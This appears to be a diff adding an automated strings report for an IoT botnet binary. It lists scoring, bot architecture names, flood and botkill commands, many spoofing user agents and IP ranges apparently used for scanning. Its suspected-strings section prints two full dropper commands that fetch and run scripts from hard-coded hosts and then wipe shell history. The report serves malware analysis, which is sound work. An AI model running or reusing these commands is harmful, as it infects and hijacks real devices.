@@ -1,0 +1,2542 @@
+=============================================================================
+========	BINARY ID :a32c2336df47b905e291345265efe08c722276b4==================================================
+================================================================================
+================================================================================
+========	STRINGS SUMMARY : =====================================================
+================================================================================
+TOTAL STRINGS COUNT :2101
+SUPSCPECTED LINES COUNT :135
+SUPSCPECTED STRINGS COUNT (DISTINCT) :19
+SUPSCPECTED STRINGS WEIGHT :74
+SUSPECT STRING SCORE : [74 / 150] 49%
+USER AGENTS STRINGS COUNT :105
+STATIC IPs STRINGS COUNT :2
+DYNAMIC IPs STRINGS COUNT :247
+================================================================================
+========	STRINGS DETAILS : =====================================================
+================================================================================
+================================================================================
+========	SUSPECTED STRINGS : =====================================================
+================================================================================
+cd /tmp || cd /var/system || cd /mnt || cd /lib;rm -f /tmp/ || /var/run/ || /var/system/ || /mnt/ || /lib/;cd /tmp || cd /var/run || cd /mnt || cd /root || cd /;busybox wget http://185.101.107.128/UqHDZbqr9S.sh;chmod 777;sh UqHDZbqr9S.sh;busybox tftp -g 185.158.113.30 -r EeckYqY9dV.sh;chmod 777 ;sh EeckYqY9dV.sh;busybox tftp -g 185.158.113.30 -r FRw5K9b9sb.sh;chmod 777 ;sh FRw5K9b9sb.sh\r\n
+/dev/netslink/
+/usr/
+telnet
+Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36
+Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36
+Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36
+Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36
+Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/
+Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36
+Mozilla/5.0 (Linux; Android 5.1.1; LGLS751 Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.91 Mobi
+Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36
+Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36
+Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_3 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13G3
+Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36 OPR/42.0.23'
+Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2683.0 Safari/537.36
+Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36
+Mozilla/5.0 (Linux; Android 5.1.1; LG-K330 Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.91 Mobi
+Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2672.0 Safari/537.36
+Mozilla/5.0 (iPhone; CPU iPhone OS 10_2 like Mac OS X) AppleWebKit/602.3.12 (KHTML, like Gecko) Version/10.0 Mobile/14C9
+Mozilla/5.0 (iPhone; CPU iPhone OS 10_1_1 like Mac OS X) AppleWebKit/602.2.14 (KHTML, like Gecko) Version/10.0 Mobile/14
+Mozilla/5.0 (Linux; Android 4.4.2; LGLS740 Build/KOT49I.LS740ZV6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.288
+Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.91 Safari/537.36
+Mozilla/5.0 (Linux; Android 4.4.4; HUAWEI H892L Build/HuaweiH892L) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.28
+Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2486.0 Safari/537.36 Edge/1
+Mozilla/5.0 (Linux; Android 5.0.1; SAMSUNG SM-N910R4 USCC Build/LRX22C) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBr
+Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36 OPR/42.0.2
+Mozilla/5.0 (Linux; Android 5.1.1; SM-G925T Build/LMY47X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.91 Mob
+Mozilla/5.0 (X11; CrOS x86_64 8743.85.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.101 Safari/537.36
+Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36
+Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393
+Mozilla/5.0 (X11; CrOS x86_64 8872.76.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.105 Safari/537.36
+Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.114 Safari/537.36
+Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36
+Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.1.2883.83 Secure/55.1.2883.373 Saf
+Mozilla/5.0 (Linux; Android 5.1.1; LGLS665 Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.93 Mobile Safari/537.36
+Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
+Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG-SM-N910A Build/LMY47X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/55.0.2883.91 Mobile Safari/537.36 Instagram 10.5.1 Android (22/5.1.1; 640dpi; 1440x2560; samsung; SAMSUNG-SM-N910A; trlteatt; qcom; en_US)
+Mozilla/5.0 (iPhone; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10
+Mozilla/6.0 (Future Star Technologies Corp. Star-Blade OS; U; en-US) iNet Browser 2.5
+Mozilla/5.0(iPad; U; CPU iPhone OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B314 Safari/531.21.10gin_lib.cc
+Mozilla/5.0 Slackware/13.37 (X11; U; Linux x86_64; en-US) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.41
+Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (Windows; U; Windows NT 5.1; en) AppleWebKit/886; U; en) Presto/2.4.15Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0
+Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; MyIE2; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0)
+Mozilla/5.0 (Windows; U; Win 9x 4.90; SG; rv:1.9.2.4) Gecko/20101104 Netscape/9.1.0285
+BlackBerry9700/5.0.0.743 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/100findlinks/2.0.1 (+http://wortschatz.uni-leipzig.de/findlinks/)
+findlinks/1.1.6-beta6 (+http://wortschatz.uni-leipzig.de/findlinks/)
+findlinks/1.1.6-beta4 (+http://wortschatz.uni-leipzig.de/findlinks/)
+findlinks/1.1.6-beta1 (+http://wortschatz.uni-leipzig.de/findlinks/)
+findlinks/1.1.5-beta7 (+http://wortschatz.uni-leipzig.de/findlinks/)
+Mozilla/5.0 (X11; U; Linux i686; nl; rv:1.8.1b2) Gecko/20060821 BonEcho/2.0b2 (Debian-1.99+2.0b2+dfsg-1)
+AppEngine-Google; (+http://code.google.com/appengine; appid: webetrex)
+AppEngine-Google; (+http://code.google.com/appengine; appid: unblock4myspace)AppEngine-Google; (+http://code.google.com/appengine; appid: tunisproxy)
+AppEngine-Google; (+http://code.google.com/appengine; appid: proxy-in-rs)
+AppEngine-Google; (+http://code.google.com/appengine; appid: proxy-ba-k)
+AppEngine-Google; (+http://code.google.com/appengine; appid: moelonepyaeshan)
+AppEngine-Google; (+http://code.google.com/appengine; appid: mirrorrr)
+AppEngine-Google; (+http://code.google.com/appengine; appid: mapremiereapplication)
+AppEngine-Google; (+http://code.google.com/appengine; appid: longbows-hideout)
+AppEngine-Google; (+http://code.google.com/appengine; appid: eduas23)
+AppEngine-Google; (+http://code.google.com/appengine; appid: craigserver)
+AppEngine-Google; ( http://code.google.com/appengine; appid: proxy-ba-k)
+magpie-crawler/1.1 (U; Linux amd64; en-GB; +http://www.brandwatch.net)
+Mozilla/5.0 (compatible; MJ12bot/v1.2.4; http://www.majestic12.co.uk/bot.php?+)
+Mozilla/5.0 (compatible; MJ12bot/v1.2.3; http://www.majestic12.co.uk/bot.php?+)
+MJ12bot/v1.0.8 (http://majestic12.co.uk/bot.php?+)
+MJ12bot/v1.0.7 (http://majestic12.co.uk/bot.php?+)
+Mozilla/5.0 (compatible; MojeekBot/2.0; http://www.mojeek.com/bot.html)
+telnetd
+botmips
+botmipsel
+botsh4
+botx86_64
+botarmv6l
+boti686
+botpowerpc
+boti586
+botm68k
+botsparc
+botarmv4l
+botarmv5l
+botpowerpc440fp
+/bin/sh
+/proc/cpuinfo
+PING
+gethostbyname
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.101.107.128/bins.sh; curl -O http://185.158.113.30/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 185.158.113.30 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 185.158.113.30; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 185.158.113.30 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *;history -c;history -w;rm -rf ~/.bash_history\r\n
+Hpkill -9 
+pkill -9 "
+%s %s HTTP/1.1\r\nConnection: %s\r\nAccept: */*\r\nUser-Agent: %s\r\n
+TELNET
+TELNET ON | OFF
+[TELNET] OFF
+[TELNET] ON
+BOTKILL
+Killing - %s
+KILLATTK
+URSTRAITKANCER
+/proc/net/route
+/usr/bin/python
+/usr/sbin/dropbear
+[ %s CONNECTED ] [ %s: ] [ Arch Type: %s ]
+ !"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_`ABCDEFGHIJKLMNOPQRSTUVWXYZ{|}~
+No such process
+Interrupted system call
+No child processes
+Too many open files in system
+Read-only file system
+Level 2 not synchronized
+Machine is not on the network
+Name not unique on network
+Interrupted system call should be restarted
+Socket operation on non-socket
+Protocol wrong type for socket
+Socket type not supported
+Network is down
+Network is unreachable
+Network dropped connection on reset
+Software caused connection abort
+Connection reset by peer
+Transport endpoint is already connected
+Transport endpoint is not connected
+Connection timed out
+Connection refused
+Host is down
+No route to host
+Operation already in progress
+Operation now in progress
+Unknown host
+Host name lookup failure
+?/bin/sh
+ !"#$%&'()*+,-./0123456789:;<=>?@abcdefghijklmnopqrstuvwxyz[\\]^_`abcdefghijklmnopqrstuvwxyz{|}~
+/etc/hosts
+/etc/config/hosts
+`\bᾐ᐀羀렀耸Ѐ뾀᐀왌舱H禗8Ȁᾰ᠀ᾀ쀀T㸄ͼ砃H림恼砛ᾰᨀ羁밀㼹᠀सЀ捽硛Ѽ砃ｋ쇶恼砛耯
+================================================================================
+========	USER AGENTS STRINGS : =====================================================
+================================================================================
+Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36
+Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36
+Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36
+Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36
+Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/
+Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36
+Mozilla/5.0 (Linux; Android 5.1.1; LGLS751 Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.91 Mobi
+Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36
+Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36
+Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_3 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13G3
+Mozilla/5.0 (Windows NT 6.1; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0
+Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36 OPR/42.0.23'
+Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2683.0 Safari/537.36
+Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36
+Mozilla/4.0 (compatible; MSIE 999.1; Unknown)
+Mozilla/5.0 (Linux; Android 5.1.1; LG-K330 Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.91 Mobi
+Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2672.0 Safari/537.36
+Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)
+Mozilla/5.0 (iPhone; CPU iPhone OS 10_2 like Mac OS X) AppleWebKit/602.3.12 (KHTML, like Gecko) Version/10.0 Mobile/14C9
+Mozilla/5.0 (iPhone; CPU iPhone OS 10_1_1 like Mac OS X) AppleWebKit/602.2.14 (KHTML, like Gecko) Version/10.0 Mobile/14
+Mozilla/5.0 (Linux; Android 4.4.2; LGLS740 Build/KOT49I.LS740ZV6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.288
+Mozilla/5.0 (Windows NT 10.0; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0
+Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.91 Safari/537.36
+Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:50.0) Gecko/20100101 Firefox/50.0
+Mozilla/5.0 (Linux; Android 4.4.4; HUAWEI H892L Build/HuaweiH892L) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.28
+Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2486.0 Safari/537.36 Edge/1
+Mozilla/5.0 (Windows NT 6.3; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0
+Mozilla/5.0 (Linux; Android 5.0.1; SAMSUNG SM-N910R4 USCC Build/LRX22C) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBr
+Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36 OPR/42.0.2
+Mozilla/5.0 (Linux; Android 5.1.1; SM-G925T Build/LMY47X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.91 Mob
+Mozilla/5.0 (Windows NT 6.1; rv:50.0) Gecko/20100101 Firefox/50.0
+Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+Mozilla/5.0 (X11; CrOS x86_64 8743.85.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.101 Safari/537.36
+Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36
+Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393
+Mozilla/5.0 (X11; CrOS x86_64 8872.76.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.105 Safari/537.36
+Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:52.0) Gecko/20100101 Firefox/52.0
+Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.114 Safari/537.36
+Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36
+Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.1.2883.83 Secure/55.1.2883.373 Saf
+Mozilla/5.0 (Linux; Android 5.1.1; LGLS665 Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.93 Mobile Safari/537.36
+Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
+Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG-SM-N910A Build/LMY47X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/55.0.2883.91 Mobile Safari/537.36 Instagram 10.5.1 Android (22/5.1.1; 640dpi; 1440x2560; samsung; SAMSUNG-SM-N910A; trlteatt; qcom; en_US)
+Mozilla/5.0 (compatible; Konqueror/3.0; i686 Linux; 20021117)
+Mozilla/5.0 (Windows NT 6.1; WOW64) SkypeUriPreview Preview/0.5
+Mozilla/5.0 (iPhone; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10
+Mozilla/5.0 Galeon/1.0.3 (X11; Linux i686; U;) Gecko/0
+Opera/6.04 (Windows XP; U) [en]
+Opera/9.99 (X11; U; sk)
+Mozilla/6.0 (Future Star Technologies Corp. Star-Blade OS; U; en-US) iNet Browser 2.5
+Mozilla/5.0(iPad; U; CPU iPhone OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B314 Safari/531.21.10gin_lib.cc
+Mozilla/5.0 Galeon/1.2.9 (X11; Linux i686; U;) Gecko/20021213 Debian/1.2.9-0.bunk
+Mozilla/5.0 Slackware/13.37 (X11; U; Linux x86_64; en-US) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.41
+Mozilla/5.0 (compatible; iCab 3.0.3; Macintosh; U; PPC Mac OS)
+Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (Windows; U; Windows NT 5.1; en) AppleWebKit/886; U; en) Presto/2.4.15Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0
+Mozilla/5.0 (X11; U; Linux ppc; en-US; rv:1.9a8) Gecko/2007100620 GranParadiso/3.1
+Mozilla/5.0 (compatible; U; ABrowse 0.6; Syllable) AppleWebKit/420+ (KHTML, like Gecko)
+Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en; rv:1.8.1.11) Gecko/20071128 Camino/1.5.4
+Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201
+Mozilla/5.0 (X11; U; Linux i686; pl-PL; rv:1.9.0.6) Gecko/2009020911
+Mozilla/5.0 (Windows; U; Windows NT 6.1; cs; rv:1.9.2.6) Gecko/20100628 myibrow/4alpha2
+Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; MyIE2; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0)
+Mozilla/5.0 (Windows; U; Win 9x 4.90; SG; rv:1.9.2.4) Gecko/20101104 Netscape/9.1.0285
+Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko/20090327 Galeon/2.0.7
+Mozilla/5.0 (PLAYSTATION 3; 3.55)
+Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Thunderbird/38.2.0 Lightning/4.0.2
+wii libnup/1.0
+Mozilla/4.0 (PSP (PlayStation Portable); 2.00)
+PSP (PlayStation Portable); 2.00
+Bunjalloo/0.7.6(Nintendo DS;U;en)
+Doris/1.15 [en] (Symbian)
+BlackBerry7520/4.0.0 Profile/MIDP-2.0 Configuration/CLDC-1.1
+BlackBerry9700/5.0.0.743 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/100findlinks/2.0.1 (+http://wortschatz.uni-leipzig.de/findlinks/)
+findlinks/1.1.6-beta6 (+http://wortschatz.uni-leipzig.de/findlinks/)
+findlinks/1.1.6-beta4 (+http://wortschatz.uni-leipzig.de/findlinks/)
+findlinks/1.1.6-beta1 (+http://wortschatz.uni-leipzig.de/findlinks/)
+findlinks/1.1.5-beta7 (+http://wortschatz.uni-leipzig.de/findlinks/)
+Mozilla/5.0 (Windows; U; WinNT; en; rv:1.0.2) Gecko/20030311 Beonex/0.8.2-stable
+Mozilla/5.0 (Windows; U; WinNT; en; Preview) Gecko/20020603 Beonex/0.8-stable
+Mozilla/5.0 (X11; U; Linux i686; nl; rv:1.8.1b2) Gecko/20060821 BonEcho/2.0b2 (Debian-1.99+2.0b2+dfsg-1)
+Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1b2) Gecko/20060821 BonEcho/2.0b2
+Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1b2) Gecko/20060826 BonEcho/2.0b2
+Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:1.8.1b2) Gecko/20060831 BonEcho/2.0b2
+Mozilla/5.0 (X11; U; Linux x86_64; en-GB; rv:1.8.1b1) Gecko/20060601 BonEcho/2.0b1 (Ubuntu-edgy)
+Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1a3) Gecko/20060526 BonEcho/2.0a3
+Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.8.1a2) Gecko/20060512 BonEcho/2.0a2
+Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1a2) Gecko/20060512 BonEcho/2.0a2
+Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.8.1a2) Gecko/20060512 BonEcho/2.0a2
+AppEngine-Google; (+http://code.google.com/appengine; appid: webetrex)
+AppEngine-Google; (+http://code.google.com/appengine; appid: unblock4myspace)AppEngine-Google; (+http://code.google.com/appengine; appid: tunisproxy)
+AppEngine-Google; (+http://code.google.com/appengine; appid: proxy-in-rs)
+AppEngine-Google; (+http://code.google.com/appengine; appid: proxy-ba-k)
+AppEngine-Google; (+http://code.google.com/appengine; appid: moelonepyaeshan)
+AppEngine-Google; (+http://code.google.com/appengine; appid: mirrorrr)
+AppEngine-Google; (+http://code.google.com/appengine; appid: mapremiereapplication)
+AppEngine-Google; (+http://code.google.com/appengine; appid: longbows-hideout)
+AppEngine-Google; (+http://code.google.com/appengine; appid: eduas23)
+AppEngine-Google; (+http://code.google.com/appengine; appid: craigserver)
+AppEngine-Google; ( http://code.google.com/appengine; appid: proxy-ba-k)
+Mozilla/5.0 (compatible; MJ12bot/v1.2.4; http://www.majestic12.co.uk/bot.php?+)
+Mozilla/5.0 (compatible; MJ12bot/v1.2.3; http://www.majestic12.co.uk/bot.php?+)
+MJ12bot/v1.0.8 (http://majestic12.co.uk/bot.php?+)
+MJ12bot/v1.0.7 (http://majestic12.co.uk/bot.php?+)
+Mozilla/5.0 (compatible; MojeekBot/2.0; http://www.mojeek.com/bot.html)
+%s %s HTTP/1.1\r\nConnection: %s\r\nAccept: */*\r\nUser-Agent: %s\r\n
+================================================================================
+========	STATIC IP ADRESSES : =====================================================
+================================================================================
+185.101.107.128
+8.8.8.8
+================================================================================
+========	DYNAMIC IP MASKS : =====================================================
+================================================================================
+1.10.%d.%d
+1.120.%d.%d
+5.140.%d.%d
+5.141.%d.%d
+122.2.%d.%d
+122.3.%d.%d
+122.53.%d.%d
+122.54.%d.%d
+188.16.%d.%d
+188.17.%d.%d
+188.18.%d.%d
+188.19.%d.%d
+31.162.%d.%d
+31.163.%d.%d
+5.142.%d.%d
+5.143.%d.%d
+90.150.%d.%d
+90.151.%d.%d
+178.47.%d.%d
+94.50.%d.%d
+94.51.%d.%d
+190.43.%d.%d
+210.5.%d.%d
+210.213.%d.%d
+27.0.%d.%d
+27.8.%d.%d
+27.50.%d.%d
+27.54.%d.%d
+27.98.%d.%d
+27.112.%d.%d
+27.192.%d.%d
+186.128.%d.%d
+186.132.%d.%d
+186.39.%d.%d
+186.56.%d.%d
+186.57.%d.%d
+186.58.%d.%d
+186.60.%d.%d
+46.181.%d.%d
+46.180.%d.%d
+188.173.%d.%d
+64.137.%d.%d
+103.20.%d.%d
+103.47.%d.%d
+103.57.%d.%d
+103.30.%d.%d
+103.54.%d.%d
+103.204.%d.%d
+103.44.%d.%d
+103.198.%d.%d
+103.203.%d.%d
+103.220.%d.%d
+103.242.%d.%d
+103.14.%d.%d
+103.195.%d.%d
+103.214.%d.%d
+103.218.%d.%d
+103.225.%d.%d
+103.228.%d.%d
+103.231.%d.%d
+103.60.%d.%d
+103.248.%d.%d
+103.253.%d.%d
+103.255.%d.%d
+103.35.%d.%d
+103.49.%d.%d
+103.62.%d.%d
+98.27.%d.%d
+98.179.%d.%d
+98.113.%d.%d
+98.121.%d.%d
+98.100.%d.%d
+98.161.%d.%d
+98.165.%d.%d
+112.5.%d.%d
+117.165.%d.%d
+85.3.%d.%d
+37.158.%d.%d
+95.9.%d.%d
+41.252.%d.%d
+58.71.%d.%d
+104.55.%d.%d
+78.186.%d.%d
+78.189.%d.%d
+221.120.%d.%d
+88.5.%d.%d
+41.254.%d.%d
+45.117.%d.%d
+101.51.%d.%d
+137.59.%d.%d
+1.56.%d.%d
+1.188.%d.%d
+14.204.%d.%d
+36.32.%d.%d
+36.248.%d.%d
+39.64.%d.%d
+42.4.%d.%d
+42.48.%d.%d
+42.52.%d.%d
+42.56.%d.%d
+42.63.%d.%d
+42.84.%d.%d
+42.176.%d.%d
+42.224.%d.%d
+43.253.%d.%d
+43.230.%d.%d
+163.53.%d.%d
+62.252.%d.%d
+43.245.%d.%d
+62.255.%d.%d
+77.96.%d.%d
+77.97.%d.%d
+77.98.%d.%d
+77.100.%d.%d
+77.102.%d.%d
+113.191.%d.%d
+81.100.%d.%d
+113.188.%d.%d
+113.189.%d.%d
+94.174.%d.%d
+14.160.%d.%d
+14.161.%d.%d
+14.162.%d.%d
+14.163.%d.%d
+14.164.%d.%d
+14.165.%d.%d
+14.166.%d.%d
+14.167.%d.%d
+14.168.%d.%d
+14.169.%d.%d
+14.170.%d.%d
+14.171.%d.%d
+14.172.%d.%d
+14.173.%d.%d
+14.174.%d.%d
+14.175.%d.%d
+14.176.%d.%d
+14.177.%d.%d
+14.178.%d.%d
+14.179.%d.%d
+14.180.%d.%d
+14.181.%d.%d
+14.182.%d.%d
+14.183.%d.%d
+14.184.%d.%d
+14.185.%d.%d
+14.186.%d.%d
+14.187.%d.%d
+14.188.%d.%d
+14.189.%d.%d
+14.190.%d.%d
+14.191.%d.%d
+45.121.%d.%d
+45.120.%d.%d
+45.115.%d.%d
+43.252.%d.%d
+43.240.%d.%d
+41.174.%d.%d
+49.118.%d.%d
+78.188.%d.%d
+45.127.%d.%d
+14.33.%d.%d
+123.16.%d.%d
+202.44.%d.%d
+116.93.%d.%d
+91.83.%d.%d
+41.253.%d.%d
+117.173.%d.%d
+113.190.%d.%d
+146.88.%d.%d
+112.196.%d.%d
+113.178.%d.%d
+112.45.%d.%d
+183.223.%d.%d
+116.71.%d.%d
+110.235.%d.%d
+124.253.%d.%d
+211.237.%d.%d
+117.175.%d.%d
+178.93.%d.%d
+111.9.%d.%d
+222.252.%d.%d
+113.174.%d.%d
+113.160.%d.%d
+113.161.%d.%d
+113.162.%d.%d
+113.163.%d.%d
+113.164.%d.%d
+113.165.%d.%d
+113.166.%d.%d
+116.167.%d.%d
+113.168.%d.%d
+113.17.%d.%d
+123.18.%d.%d
+123.19.%d.%d
+123.20.%d.%d
+123.21.%d.%d
+123.22.%d.%d
+222.253.%d.%d
+222.254.%d.%d
+222.225.%d.%d
+37.247.%d.%d
+41.208.%d.%d
+183.220.%d.%d
+175.201.%d.%d
+50.205.%d.%d
+88.248.%d.%d
+88.105.%d.%d
+88.247.%d.%d
+85.105.%d.%d
+188.3.%d.%d
+103.55.%d.%d
+103.233.%d.%d
+103.63.%d.%d
+144.48.%d.%d
